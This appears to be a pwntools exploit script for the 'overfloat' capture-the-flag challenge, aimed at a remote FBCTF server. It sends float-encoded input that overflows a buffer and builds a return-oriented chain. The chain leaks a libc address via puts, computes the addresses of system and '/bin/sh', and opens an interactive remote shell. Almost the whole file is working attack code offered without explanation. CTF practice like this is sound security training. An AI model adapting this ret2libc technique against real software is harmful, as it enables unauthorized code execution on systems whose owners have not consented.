from pwn import *
# context.log_level = 'debug'

TARGET = './overfloat'
HOST = 'challenges.fbctf.com'
PORT = 1341

# r = process(TARGET)
# r = process(TARGET, env={"LD_PRELOAD":"./libc-2.27.so"})
r = remote(HOST, PORT)

gdb.attach(r, '''
b*0x400945
b*0x400a1f
c
''')
elf = ELF(TARGET)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

def inp(addr):
    r.sendlineafter(']:', str(struct.unpack('f', p32(addr & 0xffffffff))[0]))
    r.sendlineafter(']:', str(struct.unpack('f', p32(addr >> 32))[0]))

for i in range(14):
    r.sendlineafter(']:', str(1))

rdi = 0x400a83
inp(rdi)
inp(elf.got['__libc_start_main'])
inp(elf.plt['puts'])
inp(elf.sym['main']) 
r.sendlineafter(']:', 'done')

r.recvuntil('YAGE!\n')
leak = u64(r.recv(6).ljust(8, '\x00'))
base = leak - 0x21ab0
system = base + 0x4f440
binsh = base + 0x1b3e9a
dbg("leak")
dbg("base")
for i in range(14):
    r.sendlineafter(']:', str(1))

rdi = 0x400a83
inp(rdi)
inp(binsh)
inp(rdi+1)
inp(system)
inp(elf.sym['main']) 
r.sendlineafter(']:', 'done')

r.interactive()
r.close()
